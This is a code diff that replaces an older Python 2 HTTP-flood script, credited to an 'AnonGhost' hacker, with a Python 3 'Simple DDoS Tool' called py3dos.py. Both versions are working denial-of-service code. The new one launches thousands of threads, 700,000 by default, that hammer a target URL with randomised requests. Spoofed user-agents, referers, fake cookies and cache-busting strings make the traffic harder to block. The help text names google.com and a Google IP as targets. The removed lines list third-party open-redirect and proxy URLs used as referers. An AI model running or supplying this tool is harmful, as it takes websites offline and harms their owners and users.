@@ -1,122 +1,154 @@
-import urllib2
-import sys
-import threading
+import time
+from sys import argv
+import urllib.request as urllibReq
+from threading import Thread
+from colorama import Fore
+import colorama
 import random
-import re
+
+headers_referers = []
+userAgents = []
+colorama.init(autoreset=False)
+
+user_agents_file = open('user-agents.txt','r')
+header_ref_file = open('header-referers.txt','r')
+
+for agent in user_agents_file:
+    userAgents.append(agent.strip())
+
+for header_ref in header_ref_file:
+    headers_referers.append(header_ref.strip())
+
+def helpScreen():
+    print ('\nSimple DDoS Tool\n')
+    print('Usage    : py3dos.py -u [url/IP] [flags]')
+    print('Example  : py3dos.py -u https://google.com')
+    print('Example  : py3dos.py -u http://172.217.194.100')
+    print('\n')
+    print('Flags\r')
+    print('-u [url/IP] \t - Define Host/Target.')
+    print('-A \t\t - Aggressive mode. Sets The Time Between Requests To A Low Value.')
+    print('-t [int] \t - Define Number Of Threads. Accepts Only Integers. Default is 5000.')
+    print('-l [int] \t - Define Number Of Request Loops To A Thread. Accept Only Integers. Default is 0 - Unlimited.')
+    print('-e [int] \t - Maximum Number Of Errors To Exit A Thread. Accepts Only Integers. Default is 1000.')
+    print('-nL \t\t - Referered to No Load. Send Request Without Any Parameters.')
+    print('\t\t\tWith -nL Request Looks Like => http://hack.me/')
+    print('\t\t\tWithout -nL Request Looks Like => http://hack.me/[some_random_string]')
+    print('\n')
+    print('More Examples\n')
+    print('py3dos.py -u https://google.com')
+    print('py3dos.py -u https://google.com -A')
+    print('py3dos.py -u https://google.com -l 100 -t 7000')
+    print('py3dos.py -u https://google.com -t 7000 -A -e 5000')
+    print('py3dos.py -u https://google.com -A -nL \n')
+    print('py3dos.py -u http://172.217.194.100')
+    print('py3dos.py -u http://172.217.194.100 -A')
+    print('py3dos.py -u http://172.217.194.100 -l 100 -t 7000')
+    print('py3dos.py -u http://172.217.194.100 -t 7000 -A -e 5000')
+    print('py3dos.py -u http://172.217.194.100 -A -nL')
 
 
-url=''                                                                                              ###############################
-host=''                                                                                             #~~~~Created By Hax Stroke~~~~#
-headers_useragents=[]                                                                               #~~~~~~~~~~@FollowMe~~~~~~~~~~#
-headers_referers=[]                                                                                 #fb.com/anonghostsoldierstroke#
-request_counter=0                                                                                   #~~~youtube.com/c/HaXStroKE~~~#
-flag=0                                                                                              #~~~~~Twitter:@HaxStroKE~~~~~~#
-safe=0                                                                                              ###############################
 
-def inc_counter():
-	global request_counter
-	request_counter+=45
+class DOS(Thread):
+    def __init__(self,url,type=1,limit=0,thresh=1000,aggressive=1):
+        super(DOS,self).__init__()
+        self.host = ''
+        self.error = 0
+        self.thresh = thresh
+        self.url = url
+        self.type = type
+        self.limit = limit
+        self.sleep = random.randint(1,5) if(aggressive == 1) else random.randint(10,20)
+    
+    def errorInc(self):
+        self.error += 1
 
-def set_flag(val):
-	global flag
-	flag=val
+    def buildRand(self,size):
+        finalStr = ""
+        for i in range(size):
+            finalStr += chr(random.randint(65,122))
+        return finalStr
+    
+    def cookieGen(self,size):
+        cookie = ""
+        for i in range(size):
+            for i in range(random.randint(2,10)):
+                cookie += chr(random.randint(65,90))
+            for i in range(random.randint(2,5)):
+                cookie += str(random.randint(0,10))
+            if((random.randint(0,10))%5 == 0):
+                    cookie += '-'   
+            for i in range(random.randint(2,10)):
+                cookie += chr(random.randint(97,122))
+        return cookie
 
-def set_safe():
-	global safe
-	safe=1
-	
-# generates a user agent array
-def useragent_list():
-	global headers_useragents
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) BlackHawk/1.0.195.0 Chrome/127.0.0.1 Safari/62439616.534')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
-	headers_useragents.append('Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)')
-	headers_useragents.append('Mozilla/5.0 (Windows NT 6.1; rv:26.0) Gecko/20100101 Firefox/26.0 IceDragon/26.0.0.2')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
-	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
-	return(headers_useragents)
+    def httpReq(self,url):
+        if url.count('?') > 0:
+            self.paramJoiner = '&'
+        else:
+            self.paramJoiner = '?'
 
-# generates a referer array
-def referer_list():
-	global headers_referers
-	headers_referers.append('http://www.google.com/?q=')                                       ############################
-	headers_referers.append('http://www.usatoday.com/search/results?q=')                       #Pre-configured            #
-	headers_referers.append('http://engadget.search.aol.com/search?q=')                        #Botnets                   #
-	headers_referers.append('http://www.google.com/?q=')                                       #Infected's Websites       #
-	headers_referers.append('http://www.usatoday.com/search/results?q=')                       #Best's Shells Only        #
-	headers_referers.append('http://engadget.search.aol.com/search?q=')                        #All uploaded by Hax Stroke#
-	headers_referers.append('http://www.bing.com/search?q=')                                   #From AnonGhost Team       #
-	headers_referers.append('http://search.yahoo.com/search?p=')                               ############################
-	headers_referers.append('http://www.ask.com/web?q=')
-	headers_referers.append('http://search.lycos.com/web/?q=')
-	headers_referers.append('http://busca.uol.com.br/web/?q=')
-	headers_referers.append('http://us.yhs4.search.yahoo.com/yhs/search?p=')
-	headers_referers.append('http://www.dmoz.org/search/search?q=')
-	headers_referers.append('http://www.baidu.com.br/s?usm=1&rn=100&wd=')
-	headers_referers.append('http://yandex.ru/yandsearch?text=')
-	headers_referers.append('http://www.zhongsou.com/third?w=')
-	headers_referers.append('http://hksearch.timway.com/search.php?query=')
-	headers_referers.append('http://find.ezilon.com/search.php?q=')
-	headers_referers.append('http://www.sogou.com/web?query=')
-	headers_referers.append('http://api.duckduckgo.com/html/?q=')
-	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
-        headers_referers.append('http://validator.w3.org/check?uri=')
-        headers_referers.append('http://validator.w3.org/checklink?uri=')
-        headers_referers.append('http://validator.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=')
-        headers_referers.append('http://validator.w3.org/nu/?doc=')
-        headers_referers.append('http://validator.w3.org/mobile/check?docAddr=')
-        headers_referers.append('http://validator.w3.org/p3p/20020128/p3p.pl?uri=')
-        headers_referers.append('http://www.icap2014.com/cms/sites/all/modules/ckeditor_link/proxy.php?url=')
-	headers_referers.append('http://www.rssboard.org/rss-validator/check.cgi?url=')
-	headers_referers.append('http://www2.ogs.state.ny.us/help/urlstatusgo.html?url=')
-	headers_referers.append('http://prodvigator.bg/redirect.php?url=')
-	headers_referers.append('http://validator.w3.org/feed/check.cgi?url=')
-	headers_referers.append('http://www.ccm.edu/redirect/goto.asp?myURL=')
-	headers_referers.append('http://forum.buffed.de/redirect.php?url=')
-	headers_referers.append('http://rissa.kommune.no/engine/redirect.php?url=')
-	headers_referers.append('http://www.sadsong.net/redirect.php?url=')
-	headers_referers.append('https://www.fvsbank.com/redirect.php?url=')
-	headers_referers.append('http://www.jerrywho.de/?s=/redirect.php?url=')
-	headers_referers.append('http://www.inow.co.nz/redirect.php?url=')
-	headers_referers.append('http://www.automation-drive.com/redirect.php?url=')
-	headers_referers.append('http://mytinyfile.com/redirect.php?url=')
-	headers_referers.append('http://ruforum.mt5.com/redirect.php?url=')
-	headers_referers.append('http://www.websiteperformance.info/redirect.php?url=')
-	headers_referers.append('http://www.airberlin.com/site/redirect.php?url=')
-	headers_referers.append('http://www.rpz-ekhn.de/mail2date/ServiceCenter/redirect.php?url=')
-	headers_referers.append('http://evoec.com/review/redirect.php?url=')
-	headers_referers.append('http://www.crystalxp.net/redirect.php?url=')
-	headers_referers.append('http://watchmovies.cba.pl/articles/includes/redirect.php?url=')
-	headers_referers.append('http://www.seowizard.ir/redirect.php?url=')
-	headers_referers.append('http://apke.ru/redirect.php?url=')
-	headers_referers.append('http://seodrum.com/redirect.php?url=')
-	headers_referers.append('http://redrool.com/redirect.php?url=')
-	headers_referers.append('http://blog.eduzones.com/redirect.php?url=')
-	headers_referers.append('http://www.onlineseoreportcard.com/redirect.php?url=')
-	headers_referers.append('http://www.wickedfire.com/redirect.php?url=')
-	headers_referers.append('http://searchtoday.info/redirect.php?url=')
-	headers_referers.append('http://www.bobsoccer.ru/redirect.php?url=')
-	headers_referers.append('http://newsdiffs.org/article-history/iowaairs.org/redirect.php?url=')
-	headers_referers.append('http://seo.qalebfa.ir/%D8%B3%D8%A6%D9%88%DA%A9%D8%A7%D8%B1/redirect.php?url=')
-	headers_referers.append('http://www.firmia.cz/redirect.php?url=')
-	headers_referers.append('http://www.e39-forum.de/redir.php?url=')
-	headers_referers.append('http://www.wopus.org/wp-content/themes/begin/inc/go.php?url=')
-	headers_referers.append('http://www.selectsmart.com/plus/select.php?url=')
-	headers_referers.append('http://www.taichinh2a.com/forum/links.php?url=')
-	headers_referers.append('http://facenama.com/go.php?url=')
-	headers_referers.append('http://www.internet-abc.de/eltern/118732.php?url=')
-	headers_referers.append('http://g.makebd.com/index.php?url=')
-	headers_referers.append('https://blog.eduzones.com/redirect.php?url=')
-	headers_referers.append('http://www.mientay24h.vn/redirector.php?url=')
-	headers_referers.append('http://www.kapook.com/webout.php?url=')
-	headers_referers.append('http://lue4.ddns.name/pk/index.php?url=')
-	headers_referers.append('http://747.ddns.ms/pk/index.php?url=')
-	headers_referers.append('http://737.ddns.us/pk/index.php?url=')
-	headers_referers.append('http://a30.m1.4irc.com/pk/index.php?url=')
+        self.payload = f'{url}{self.paramJoiner}{self.buildRand(random.randint(10,40))}={self.buildRand(random.randint(10,20))}' if self.type==1 else f'{self.url}'
+        self.req = urllibReq.Request(self.payload)
+        self.req.add_header('User-agent',random.choice(userAgents))
+        self.req.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
+        self.req.add_header('Cache-Control', 'no-cache')
+        self.req.add_header('Accept-Encoding','gzip,deflate')
+        self.req.add_header('Referer', random.choice(headers_referers) + self.buildRand(random.randint(60,200)))
+        self.req.add_header('Keep-Alive', random.randint(2000,10000))
+        self.req.add_header('connection', f'{"keep-alive" if(random.randint(0,20)%2 == 0) else "close"}')
+        self.req.add_header('content-Type', 'application/x-www-form-urlencoded')
+        self.req.add_header('set-cookie',f'SIDCC={self.cookieGen(random.randint(5,10))}; path=/; domain=.google.com; priority=high')
+        self.req.add_header('Host',self.host)
+        try:
+            urllibReq.urlopen(self.req)
+            print(Fore.GREEN + f'[+] Sending traffic to -> {url} \r')
+        except:
+            print(Fore.RED + f'[-] Target down ? \r')
+            self.errorInc()
+            
+    def run(self):
+        loop = 0 if(self.limit != 0) else -1
+        while((self.error<self.thresh) and (loop<self.limit)):
+            time.sleep(self.sleep)
+            self.httpReq(self.url)
+            if(self.limit!=0):loop+=1
 
+        print(Fore.CYAN + "[!] Finished \r")
+
+
+def main():
+    if(len(argv)<=2 or (argv[-1] in ['-h','-H','-help','--help'])):
+        helpScreen()
+
+
+    elif(not('-u' in argv)):
+        print(f'[-] Invalid command \r')
+        print('Type py3dos.py -h  for more details.')
+    
+    else:
+        target = argv[argv.index('-u')+1]
+        if(('http') not in target):
+            print(f'[-] Invalid command \r')
+            print('Type py3dos.py -h  for more details.')
+        else:
+            try:
+                noLoad = 0 if('-nL' in argv) else 1
+                threads = int(argv[argv.index('-t')+1]) if('-t' in argv) else 700000
+                loops = int(argv[argv.index('-l')+1]) if('-l' in argv) else 0
+                errorThresh = int(argv[argv.index('-e')+1]) if('-e' in argv) else 1000
+                aggressive = 1 if('-A' in argv) else 0
+
+                print(Fore.CYAN + f"[!] Starting the attack on {target} \r")
+                print(Fore.CYAN + f"[!] Threads : {threads} \r")
+                if(loops != 0):print(Fore.CYAN + f"[!] Loops for 1 thread : {loops} \r")
+
+                [DOS(f'{target}',noLoad,loops,errorThresh,aggressive).start() for i in range(threads)]
+            except:
+                print("Ooops! Something is not right :(")
+                print('Type py3dos.py -h  for more details.')
+                
+
+
+if __name__ == "__main__":
+    main()
